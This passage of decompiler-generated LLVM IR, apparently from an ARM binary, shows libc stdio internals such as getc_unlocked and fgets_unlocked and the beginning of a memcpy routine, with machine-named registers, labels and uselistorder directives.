  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3, 5, 4, 6, 8, 7, 9 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 9, 8, 53, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 55, 22, 23, 24, 25, 26, 27, 29, 28, 1, 30, 31, 32, 33, 35, 34, 54, 36, 37, 38, 39, 41, 40, 0, 42, 43, 44, 45, 47, 46, 2, 48, 49, 52, 50, 51 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 5, 3, 4, 22, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 12, 2, 3, 4, 33, 34, 5, 6, 7, 8, 9, 37, 38, 10, 11, 30, 13, 14, 16, 15, 0, 17, 18, 19, 35, 36, 20, 21, 22, 23, 31, 32, 24, 25, 26, 39, 40, 27, 28, 29 }
  uselistorder i32 92, { 0, 1, 2, 5, 3, 4, 6 }
  uselistorder i32 152, { 1, 3, 2, 4, 5, 8, 6, 9, 7, 10, 0, 11, 12, 14, 13, 15, 18, 16, 19, 17, 20 }
  uselistorder i32 129, { 7, 8, 9, 5, 6, 10, 11, 0, 1, 2, 3, 4, 12, 13 }
  uselistorder i32 -61504, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 34, 35, 36, 32, 33 }
  uselistorder i32 -61441, { 16, 17, 18, 19, 20, 21, 12, 13, 14, 15, 22, 23, 24, 25, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 32, 26, 27, 28, 29, 30, 31 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %bb73, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_16414, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_163ec, { 2, 1, 0 }
  uselistorder label %dec_label_pc_163d4, { 1, 0 }
  uselistorder label %bb71, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16354, { 1, 0 }
  uselistorder label %dec_label_pc_16348, { 1, 0 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %dec_label_pc_16338, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16320, { 1, 0 }
  uselistorder label %dec_label_pc_162dc, { 1, 0 }
  uselistorder label %dec_label_pc_162ccthread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_162a4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1628c, { 1, 0 }
  uselistorder label %dec_label_pc_1624c, { 1, 0 }
  uselistorder label %bb68, { 1, 0 }
  uselistorder label %dec_label_pc_1623c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16224, { 1, 0 }
  uselistorder label %dec_label_pc_161f8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_161d0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_161b8, { 1, 0 }
  uselistorder label %dec_label_pc_16170, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %dec_label_pc_16160, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16148, { 1, 0 }
  uselistorder label %dec_label_pc_16114, { 1, 0 }
}

define i32 @function_16470(i32 %arg1) local_unnamed_addr {
dec_label_pc_16470:
  %v0_16470 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16470, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_16470
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_16470, %bb
  %v10_16480 = phi i32 [ %arg1, %dec_label_pc_16470 ], [ 0, %bb ]
  ret i32 %v10_16480

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_16484 = load i32, i32* @r4, align 4
  store i32 %v3_16484, i32* %stack_var_-12, align 4
  %v6_16484 = load i32, i32* @r5, align 4
  %v9_16484 = load i32, i32* @lr, align 4
  %v0_16488 = load i32, i32* @r0, align 4
  %v1_16488 = add i32 %v0_16488, 16
  %v2_16488 = inttoptr i32 %v1_16488 to i32*
  %v3_16488 = load i32, i32* %v2_16488, align 4
  store i32 %v3_16488, i32* %r2.global-to-local, align 4
  %v1_1648c = add i32 %v0_16488, 24
  %v2_1648c = inttoptr i32 %v1_1648c to i32*
  %v3_1648c = load i32, i32* %v2_1648c, align 4
  %v3_16490 = icmp ult i32 %v3_16488, %v3_1648c
  store i32 %v0_16488, i32* @r4, align 4
  br i1 %v3_16490, label %bb, label %dec_label_pc_164b0

bb:                                               ; preds = %entry
  %v2_1649c = inttoptr i32 %v3_16488 to i8*
  %v3_1649c = load i8, i8* %v2_1649c, align 1
  %v4_1649c = zext i8 %v3_1649c to i32
  store i32 %v4_1649c, i32* %r0.global-to-local, align 4
  %v6_1649c = add i32 %v3_16488, 1
  store i32 %v6_1649c, i32* %r2.global-to-local, align 4
  store i32 %v6_1649c, i32* %v2_16488, align 4
  br label %dec_label_pc_1659c

dec_label_pc_164b0:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* @r5, align 4
  %v1_164b0 = inttoptr i32 %v0_16488 to i16*
  %v2_164b0 = load i16, i16* %v1_164b0, align 2
  %v3_164b0 = zext i16 %v2_164b0 to i32
  %v1_164b4 = and i32 %v3_164b0, 131
  %tmp25 = icmp ugt i32 %v1_164b4, 128
  br i1 %tmp25, label %dec_label_pc_164d0, label %dec_label_pc_164c0

dec_label_pc_164c0:                               ; preds = %dec_label_pc_164b0
  store i32 128, i32* @r1, align 4
  %v0_164c4 = call i32 @__stdio_trans2r_o()
  store i32 %v0_164c4, i32* %r0.global-to-local, align 4
  %v2_164c8 = icmp eq i32 %v0_164c4, 0
  br i1 %v2_164c8, label %dec_label_pc_164c0.dec_label_pc_164d0_crit_edge, label %dec_label_pc_16598

dec_label_pc_164c0.dec_label_pc_164d0_crit_edge:  ; preds = %dec_label_pc_164c0
  %v0_164d0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_164d0

dec_label_pc_164d0:                               ; preds = %dec_label_pc_164c0.dec_label_pc_164d0_crit_edge, %dec_label_pc_164b0
  %v2_16510 = phi i32 [ %v0_164d0.pre, %dec_label_pc_164c0.dec_label_pc_164d0_crit_edge ], [ %v0_16488, %dec_label_pc_164b0 ]
  %v1_164d0 = inttoptr i32 %v2_16510 to i16*
  %v2_164d0 = load i16, i16* %v1_164d0, align 2
  %v3_164d0 = zext i16 %v2_164d0 to i32
  store i32 %v3_164d0, i32* %r2.global-to-local, align 4
  %v1_164d4 = and i32 %v3_164d0, 2
  %v2_164d4 = icmp eq i32 %v1_164d4, 0
  br i1 %v2_164d4, label %dec_label_pc_16500, label %dec_label_pc_164dc

dec_label_pc_164dc:                               ; preds = %dec_label_pc_164d0
  %tmp26 = urem i16 %v2_164d0, 2
  %v1_164dc = zext i16 %tmp26 to i32
  %tmp22 = sub nsw i32 0, %v1_164dc
  %v4_164e0 = and i32 %tmp22, 4
  %v5_164e0 = add i32 %v4_164e0, %v2_16510
  %v1_164e4 = add i32 %v5_164e0, 36
  %v2_164e4 = inttoptr i32 %v1_164e4 to i8*
  %v3_164e4 = load i8, i8* %v2_164e4, align 1
  %v4_164e4 = zext i8 %v3_164e4 to i32
  %v1_164e8 = add nsw i32 %v3_164d0, -1
  store i32 %v1_164e8, i32* %r2.global-to-local, align 4
  store i32 %v4_164e4, i32* %r0.global-to-local, align 4
  %v2_164f4 = add i32 %v2_16510, 40
  %v3_164f4 = inttoptr i32 %v2_164f4 to i32*
  store i32 0, i32* %v3_164f4, align 4
  %v0_164f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_164f8 = trunc i32 %v0_164f8 to i16
  %v2_164f8 = load i32, i32* @r4, align 4
  %v3_164f8 = inttoptr i32 %v2_164f8 to i16*
  store i16 %v1_164f8, i16* %v3_164f8, align 2
  br label %dec_label_pc_1659c

dec_label_pc_16500:                               ; preds = %dec_label_pc_164d0
  %v1_16500 = add i32 %v2_16510, 16
  %v1_16504 = inttoptr i32 %v1_16500 to i32*
  %v2_16504 = load i32, i32* %v1_16504, align 4
  store i32 %v2_16504, i32* @r1, align 4
  %v3_16504 = add i32 %v2_16510, 20
  %v4_16504 = inttoptr i32 %v3_16504 to i32*
  %v5_16504 = load i32, i32* %v4_16504, align 4
  %v9_16508 = icmp eq i32 %v5_16504, %v2_16504
  br i1 %v9_16508, label %dec_label_pc_16518, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_16500
  %v2_1650c = inttoptr i32 %v2_16504 to i8*
  %v3_1650c = load i8, i8* %v2_1650c, align 1
  %v4_1650c = zext i8 %v3_1650c to i32
  store i32 %v4_1650c, i32* %r0.global-to-local, align 4
  %v6_1650c = add i32 %v2_16504, 1
  store i32 %v6_1650c, i32* @r1, align 4
  store i32 %v6_1650c, i32* %v1_16504, align 4
  br label %dec_label_pc_1659c

dec_label_pc_16518:                               ; preds = %dec_label_pc_16500
  %v1_16518 = add i32 %v2_16510, 4
  %v2_16518 = inttoptr i32 %v1_16518 to i32*
  %v3_16518 = load i32, i32* %v2_16518, align 4
  %v7_1651c = icmp eq i32 %v3_16518, -2
  br i1 %v7_1651c, label %.thread7, label %dec_label_pc_16530

.thread7:                                         ; preds = %dec_label_pc_16518
  %v2_16520 = or i16 %v2_164d0, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_16520, i16* %v1_164d0, align 2
  br label %dec_label_pc_1659c

dec_label_pc_16530:                               ; preds = %dec_label_pc_16518
  %v1_16530 = and i32 %v3_164d0, 768
  %v2_16530 = icmp eq i32 %v1_16530, 0
  br i1 %v2_16530, label %.thread9, label %bb23

bb23:                                             ; preds = %dec_label_pc_16530
  %v1_16538 = load i32, i32* @r5, align 4
  %v3_16538 = add i32 %v1_16538, 76
  %v4_16538 = inttoptr i32 %v3_16538 to i32*
  %v5_16538 = load i32, i32* %v4_16538, align 4
  store i32 %v5_16538, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_16530, %bb23
  store i32 91456, i32* @lr, align 4
  %v1_1653c = xor i1 %v2_16530, true
  call void @__pseudo_cond_branch(i1 %v1_1653c, i32 ptrtoint (i32* @global_var_160d8.588 to i32))
  %v0_16540 = load i32, i32* @r4, align 4
  %v1_16540 = add i32 %v0_16540, 8
  store i32 %v1_16540, i32* %r2.global-to-local, align 4
  %v1_16544 = inttoptr i32 %v1_16540 to i32*
  %v2_16544 = load i32, i32* %v1_16544, align 4
  store i32 %v2_16544, i32* %r2.global-to-local, align 4
  %v3_16544 = add i32 %v0_16540, 12
  %v4_16544 = inttoptr i32 %v3_16544 to i32*
  %v5_16544 = load i32, i32* %v4_16544, align 4
  %v9_16548 = icmp eq i32 %v5_16544, %v2_16544
  br i1 %v9_16548, label %dec_label_pc_1657c, label %dec_label_pc_16550

dec_label_pc_16550:                               ; preds = %.thread9
  %v2_16550 = add i32 %v0_16540, 24
  %v3_16550 = inttoptr i32 %v2_16550 to i32*
  store i32 %v2_16544, i32* %v3_16550, align 4
  %v0_16554 = load i32, i32* @r4, align 4
  store i32 %v0_16554, i32* %r0.global-to-local, align 4
  %v2_16558 = call i32 @__stdio_rfill(i32 %v0_16554)
  store i32 %v2_16558, i32* %r0.global-to-local, align 4
  %v2_1655c = icmp eq i32 %v2_16558, 0
  br i1 %v2_1655c, label %dec_label_pc_16598, label %dec_label_pc_16564

dec_label_pc_16564:                               ; preds = %dec_label_pc_16550
  %v0_16564 = load i32, i32* @r4, align 4
  %v1_16564 = add i32 %v0_16564, 20
  %v2_16564 = inttoptr i32 %v1_16564 to i32*
  %v3_16564 = load i32, i32* %v2_16564, align 4
  %v2_16568 = add i32 %v0_16564, 24
  %v3_16568 = inttoptr i32 %v2_16568 to i32*
  store i32 %v3_16564, i32* %v3_16568, align 4
  %v0_1656c = load i32, i32* @r4, align 4
  %v1_1656c = add i32 %v0_1656c, 16
  %v2_1656c = inttoptr i32 %v1_1656c to i32*
  %v3_1656c = load i32, i32* %v2_1656c, align 4
  %v1_16570 = inttoptr i32 %v3_1656c to i8*
  %v2_16570 = load i8, i8* %v1_16570, align 1
  %v3_16570 = zext i8 %v2_16570 to i32
  store i32 %v3_16570, i32* %r0.global-to-local, align 4
  %v5_16570 = add i32 %v3_1656c, 1
  store i32 %v5_16570, i32* %v2_1656c, align 4
  br label %dec_label_pc_1659c

dec_label_pc_1657c:                               ; preds = %.thread9
  %v1_1657c = inttoptr i32 %v0_16540 to i16*
  store i32 %v0_16540, i32* %r0.global-to-local, align 4
  %v2_16580 = ptrtoint i8* %stack_var_-17 to i32
  store i32 %v2_16580, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_16588 = call i32 @__stdio_READ(i16* %v1_1657c, i32 %v2_16580, i32 1)
  store i32 %v5_16588, i32* %r0.global-to-local, align 4
  %v2_1658c = icmp eq i32 %v5_16588, 0
  br i1 %v2_1658c, label %dec_label_pc_16598, label %bb24

bb24:                                             ; preds = %dec_label_pc_1657c
  %v4_16590 = load i8, i8* %stack_var_-17, align 1
  %v5_16590 = sext i8 %v4_16590 to i32
  store i32 %v5_16590, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1659c

dec_label_pc_16598:                               ; preds = %dec_label_pc_1657c, %dec_label_pc_164c0, %dec_label_pc_16550
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1659c

dec_label_pc_1659c:                               ; preds = %bb, %.thread7, %bb24, %.thread4, %dec_label_pc_16564, %dec_label_pc_164dc, %dec_label_pc_16598
  %v2_165a0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_165a0, i32* @r4, align 4
  store i32 %v6_16484, i32* @r5, align 4
  store i32 %v9_16484, i32* @lr, align 4
  %v1_165a4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_165a4

; uselistorder directives
  uselistorder i32 %v2_16504, { 1, 0, 2, 3 }
  uselistorder i32 %v2_16510, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_16488, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 13, 12 }
  uselistorder i32 768, { 2, 0, 3, 1, 4 }
  uselistorder label %dec_label_pc_1659c, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_16598, { 0, 2, 1 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v9_165b0 = load i32, i32* @r6, align 4
  %v12_165b0 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_165b4 = icmp eq i32 %arg2, 0
  store i1 %v2_165b4, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_1663c, label %dec_label_pc_16624.preheader

dec_label_pc_16624.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r5, align 4
  %v1_166242 = add i32 %arg2, -1
  store i32 %v1_166242, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_166248 = icmp eq i32 %arg2, 1
  store i1 %v7_166248, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_166248, label %dec_label_pc_1662c, label %dec_label_pc_165d0

dec_label_pc_165d0:                               ; preds = %dec_label_pc_16624.preheader, %dec_label_pc_16624.backedge.dec_label_pc_165d0_crit_edge
  %v0_165f4 = phi i32 [ %v0_165d0.pre, %dec_label_pc_16624.backedge.dec_label_pc_165d0_crit_edge ], [ %arg3, %dec_label_pc_16624.preheader ]
  %v1_165d0 = add i32 %v0_165f4, 16
  %v2_165d0 = inttoptr i32 %v1_165d0 to i32*
  %v3_165d0 = load i32, i32* %v2_165d0, align 4
  store i32 %v3_165d0, i32* %r2.global-to-local, align 4
  %v1_165d4 = add i32 %v0_165f4, 24
  %v2_165d4 = inttoptr i32 %v1_165d4 to i32*
  %v3_165d4 = load i32, i32* %v2_165d4, align 4
  store i32 %v3_165d4, i32* %r3.global-to-local, align 4
  %v3_165d8 = icmp uge i32 %v3_165d0, %v3_165d4
  store i1 %v3_165d8, i1* %cpsr_c.global-to-local, align 1
  %v9_165d8 = icmp eq i32 %v3_165d0, %v3_165d4
  store i1 %v9_165d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_165d8, label %dec_label_pc_165f4, label %dec_label_pc_165e0

dec_label_pc_165e0:                               ; preds = %dec_label_pc_165d0
  %v1_165e0 = inttoptr i32 %v3_165d0 to i8*
  %v2_165e0 = load i8, i8* %v1_165e0, align 1
  %v3_165e0 = zext i8 %v2_165e0 to i32
  store i32 %v3_165e0, i32* %r3.global-to-local, align 4
  %v5_165e0 = add i32 %v3_165d0, 1
  store i32 %v5_165e0, i32* %r2.global-to-local, align 4
  %v2_165e4 = load i32, i32* @r5, align 4
  %v3_165e4 = inttoptr i32 %v2_165e4 to i8*
  store i8 %v2_165e0, i8* %v3_165e4, align 1
  %v4_165e4 = load i32, i32* @r5, align 4
  %v5_165e4 = add i32 %v4_165e4, 1
  store i32 %v5_165e4, i32* @r5, align 4
  %v0_165e8 = load i32, i32* %r3.global-to-local, align 4
  %v2_165e8 = icmp ugt i32 %v0_165e8, 9
  store i1 %v2_165e8, i1* %cpsr_c.global-to-local, align 1
  %v7_165e8 = icmp eq i32 %v0_165e8, 10
  store i1 %v7_165e8, i1* %cpsr_z.global-to-local, align 1
  %v0_165ec = load i32, i32* %r2.global-to-local, align 4
  %v1_165ec = load i32, i32* @r4, align 4
  %v2_165ec = add i32 %v1_165ec, 16
  %v3_165ec = inttoptr i32 %v2_165ec to i32*
  store i32 %v0_165ec, i32* %v3_165ec, align 4
  br i1 %v7_165e8, label %dec_label_pc_1662c, label %dec_label_pc_16624.backedge

dec_label_pc_165f4:                               ; preds = %dec_label_pc_165d0
  %v1_165f4 = inttoptr i32 %v0_165f4 to i16*
  %v3_165f8 = call i32 @getc_unlocked(i16* %v1_165f4)
  %v3_165fc = icmp eq i32 %v3_165f8, -1
  store i1 %v3_165fc, i1* %cpsr_c.global-to-local, align 1
  %v8_165fc = icmp eq i32 %v3_165f8, -1
  store i1 %v8_165fc, i1* %cpsr_z.global-to-local, align 1
  %v1_16600 = urem i32 %v3_165f8, 256
  store i32 %v1_16600, i32* %r3.global-to-local, align 4
  br i1 %v3_165fc, label %dec_label_pc_16608, label %dec_label_pc_16620

dec_label_pc_16608:                               ; preds = %dec_label_pc_165f4
  %v0_16608 = load i32, i32* @r4, align 4
  %v1_16608 = inttoptr i32 %v0_16608 to i16*
  %v2_16608 = load i16, i16* %v1_16608, align 2
  %v3_16608 = zext i16 %v2_16608 to i32
  store i32 %v3_16608, i32* %r3.global-to-local, align 4
  %v1_1660c = and i32 %v3_16608, 8
  %v2_1660c = icmp eq i32 %v1_1660c, 0
  store i1 %v2_1660c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1660c, label %dec_label_pc_1662c, label %dec_label_pc_1663c

dec_label_pc_16620:                               ; preds = %dec_label_pc_165f4
  %v1_16618 = trunc i32 %v3_165f8 to i8
  %v2_16618 = load i32, i32* @r5, align 4
  %v3_16618 = inttoptr i32 %v2_16618 to i8*
  store i8 %v1_16618, i8* %v3_16618, align 1
  %v4_16618 = load i32, i32* @r5, align 4
  %v5_16618 = add i32 %v4_16618, 1
  store i32 %v5_16618, i32* @r5, align 4
  %v0_1661c = load i32, i32* %r3.global-to-local, align 4
  %v2_1661c = icmp ugt i32 %v0_1661c, 9
  store i1 %v2_1661c, i1* %cpsr_c.global-to-local, align 1
  %v7_1661c = icmp eq i32 %v0_1661c, 10
  store i1 %v7_1661c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1661c, label %dec_label_pc_1662c, label %dec_label_pc_16624.backedge

dec_label_pc_16624.backedge:                      ; preds = %dec_label_pc_16620, %dec_label_pc_165e0
  %v0_16624 = load i32, i32* @r6, align 4
  %v1_16624 = add i32 %v0_16624, -1
  store i32 %v1_16624, i32* @r6, align 4
  %v2_16624 = icmp ne i32 %v0_16624, 0
  store i1 %v2_16624, i1* %cpsr_c.global-to-local, align 1
  %v7_16624 = icmp eq i32 %v0_16624, 1
  store i1 %v7_16624, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16624, label %dec_label_pc_1662c, label %dec_label_pc_16624.backedge.dec_label_pc_165d0_crit_edge

dec_label_pc_16624.backedge.dec_label_pc_165d0_crit_edge: ; preds = %dec_label_pc_16624.backedge
  %v0_165d0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_165d0

dec_label_pc_1662c:                               ; preds = %dec_label_pc_16620, %dec_label_pc_16624.backedge, %dec_label_pc_165e0, %dec_label_pc_16624.preheader, %dec_label_pc_16608
  %v0_1662c = load i32, i32* @r5, align 4
  %v1_1662c = load i32, i32* @r7, align 4
  %v3_1662c = icmp uge i32 %v0_1662c, %v1_1662c
  store i1 %v3_1662c, i1* %cpsr_c.global-to-local, align 1
  %v9_1662c = icmp eq i32 %v0_1662c, %v1_1662c
  store i1 %v9_1662c, i1* %cpsr_z.global-to-local, align 1
  %v2_16630 = xor i1 %v9_1662c, true
  %v3_16630 = and i1 %v3_1662c, %v2_16630
  br i1 %v3_16630, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_1662c
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_16634 = inttoptr i32 %v0_1662c to i8*
  store i8 0, i8* %v7_16634, align 1
  %v0_16638.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_16638.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_1662c, %bb
  %v1_16638 = phi i1 [ %v1_16638.pre, %bb ], [ %v9_1662c, %dec_label_pc_1662c ]
  %v0_16638 = phi i1 [ %v0_16638.pre, %bb ], [ %v3_1662c, %dec_label_pc_1662c ]
  %v2_16638 = xor i1 %v1_16638, true
  %v3_16638 = and i1 %v0_16638, %v2_16638
  br i1 %v3_16638, label %.dec_label_pc_16640_crit_edge, label %dec_label_pc_1663c

.dec_label_pc_16640_crit_edge:                    ; preds = %.thread14
  %v0_16640.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_16640

dec_label_pc_1663c:                               ; preds = %entry, %dec_label_pc_16608, %.thread14
  br label %dec_label_pc_16640

dec_label_pc_16640:                               ; preds = %.dec_label_pc_16640_crit_edge, %dec_label_pc_1663c
  %v0_16640 = phi i32 [ %v0_16640.pre, %.dec_label_pc_16640_crit_edge ], [ 0, %dec_label_pc_1663c ]
  store i32 %v9_165b0, i32* @r6, align 4
  store i32 %v12_165b0, i32* @r7, align 4
  ret i32 %v0_16640

; uselistorder directives
  uselistorder i1 %v9_1662c, { 1, 0, 2 }
  uselistorder i32 %v1_1662c, { 1, 0 }
  uselistorder i32 %v0_1662c, { 0, 2, 1 }
  uselistorder i32 %v0_16624, { 2, 0, 1 }
  uselistorder i32 %v0_1661c, { 1, 0 }
  uselistorder i32 %v3_165f8, { 2, 1, 0, 3 }
  uselistorder i32 %v0_165e8, { 1, 0 }
  uselistorder i32 %v3_165d0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_165f4, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 9, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 8, 7 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_16640, { 1, 0 }
  uselistorder label %dec_label_pc_1663c, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_1662c, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_165d0, { 1, 0 }
}

define i32 @_memcpy() local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_16650 = load i32, i32* @r1, align 4
  %v1_16650 = load i32, i32* @r0, align 4
  %v2_16650 = sub i32 %v0_16650, %v1_16650
  %v3_16650 = icmp ult i32 %v0_16650, %v1_16650
  %v4_16650 = xor i32 %v1_16650, %v0_16650
  %v5_16650 = xor i32 %v2_16650, %v0_16650
  %v6_16650 = and i32 %v5_16650, %v4_16650
  %v7_16650 = icmp slt i32 %v6_16650, 0
  store i1 %v7_16650, i1* %cpsr_v.global-to-local, align 1
  %v8_16650 = icmp slt i32 %v2_16650, 0
  store i1 %v8_16650, i1* %cpsr_n.global-to-local, align 1
  %v9_16650 = icmp eq i32 %v0_16650, %v1_16650
  store i1 %v9_16650, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_16650, label %dec_label_pc_168a4, label %dec_label_pc_16658

dec_label_pc_16658:                               ; preds = %entry
  br i1 %v9_16650, label %.thread130, label %bb

.thread130:                                       ; preds = %bb153, %.thread129, %bb150, %dec_label_pc_16658
  %merge = phi i32 [ %v0_16650, %dec_label_pc_16658 ], [ %v2_16938, %bb150 ], [ %v11_16954, %bb153 ], [ %v7_16954, %.thread129 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_16658
  %v5_1665c = inttoptr i32 %v1_16650 to i8*
  store i8* %v5_1665c, i8** %stack_var_-8, align 4
  %v8_1665c = load i32, i32* @lr, align 4
  %v0_16660 = load i32, i32* @r2, align 4
  %v2_16660 = add i32 %v0_16660, -4
  store i32 %v2_16660, i32* %r2.global-to-local, align 4
  %v4_16660 = sub i32 3, %v0_16660
  %v5_16660 = and i32 %v4_16660, %v0_16660
  %v6_16660 = icmp slt i32 %v5_16660, 0
  store i1 %v6_16660, i1* %cpsr_v.global-to-local, align 1
  %v7_16660 = icmp slt i32 %v2_16660, 0
  store i1 %v7_16660, i1* %cpsr_n.global-to-local, align 1
  %v8_16660 = icmp eq i32 %v0_16660, 4
  store i1 %v8_16660, i1* %cpsr_z.global-to-local, align 1
  %v5_16664 = icmp slt i32 %v0_16660, 4
  br i1 %v5_16664, label %bb140, label %dec_label_pc_16668

dec_label_pc_16668:                               ; preds = %bb
  %v1_16668 = urem i32 %v1_16650, 4
  store i32 %v1_16668, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16668 = icmp eq i32 %v1_16668, 0
  store i1 %v2_16668, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16668, label %dec_label_pc_16670, label %dec_label_pc_1671c

dec_label_pc_16670:                               ; preds = %dec_label_pc_16668
  %v1_16670 = urem i32 %v0_16650, 4
  store i32 %v1_16670, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16670 = icmp eq i32 %v1_16670, 0
  store i1 %v2_16670, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_16650 to i2
  br i1 %v2_16670, label %dec_label_pc_16678, label %dec_label_pc_1674c

dec_label_pc_16678:                               ; preds = %dec_label_pc_16670, %dec_label_pc_16744
  %v0_1669094 = phi i32 [ %v1_16650, %dec_label_pc_16670 ], [ %v0_1686c77, %dec_label_pc_16744 ]
  %v0_1668c93 = phi i32 [ %v0_16650, %dec_label_pc_16670 ], [ %v0_16744, %dec_label_pc_16744 ]
  %v0_16678 = phi i32 [ %v2_16660, %dec_label_pc_16670 ], [ %v2_1673c, %dec_label_pc_16744 ]
  %v1_16678 = add i32 %v0_16678, -8
  store i32 %v1_16678, i32* %r2.global-to-local, align 4
  %v3_16678 = sub i32 7, %v0_16678
  %v4_16678 = and i32 %v3_16678, %v0_16678
  %v5_16678 = icmp slt i32 %v4_16678, 0
  store i1 %v5_16678, i1* %cpsr_v.global-to-local, align 1
  %v6_16678 = icmp slt i32 %v1_16678, 0
  store i1 %v6_16678, i1* %cpsr_n.global-to-local, align 1
  %v7_16678 = icmp eq i32 %v0_16678, 8
  store i1 %v7_16678, i1* %cpsr_z.global-to-local, align 1
  %v2_1667c = xor i1 %v6_16678, %v5_16678
